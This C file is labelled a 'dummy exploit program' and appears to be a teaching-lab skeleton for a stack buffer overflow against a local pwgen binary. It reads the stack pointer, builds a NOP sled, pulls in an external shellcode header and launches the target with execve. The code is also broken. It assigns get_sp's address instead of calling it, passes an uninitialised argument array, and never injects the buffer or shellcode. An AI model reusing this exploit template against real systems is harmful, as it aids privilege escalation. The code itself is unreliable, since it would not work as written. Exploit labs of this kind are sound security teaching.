/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "/usr/local/src/shellcode.h"

#define TARGET "/usr/local/bin/pwgen"
#define NOP   0x90
unsigned long get_sp(void){
__asm__("movl %esp, %eax");
}

int main(void)
{
  char *args[4],*ptr;
  long addr, *add_ptr;
  char *env[1];
  char buf[2048];
  //theres a shellcode string
  // one way to invoke pwgen, system() creates a separate process
  system("/usr/local/bin/pwgen -v");

  addr = get_sp;

  printf("using address 0x%x...\n",addr);
  add_ptr = (long *) buf;
 int i = 0;
 for(i = 0; i < 2048 ; i ++)
    buf[i] = NOP;

  env[0] = NULL;
  // execve() executes the target program by overwriting the
  // memory of the process in which execve() is executing, i.e.,
  // execve() should never return
  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
